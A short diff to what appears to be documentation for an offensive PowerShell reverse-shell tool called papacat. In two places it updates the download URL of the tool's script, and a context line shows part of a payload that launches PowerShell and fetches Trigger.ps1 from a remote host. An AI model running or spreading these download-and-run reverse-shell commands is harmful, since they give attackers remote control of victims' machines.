@@ -73,7 +73,7 @@
 
 #### Download cmdlet
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"
 ```
 
 <br />
@@ -126,7 +126,7 @@ ObjConsole.Run("powershell.exe cd $Env:TMP;iwr -Uri http://"+Cmd+"/Trigger.ps1 -
 
 #### Download cmdlet
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"
 ```
 
 #### Generate - Cmd Client (payload) Obfucated
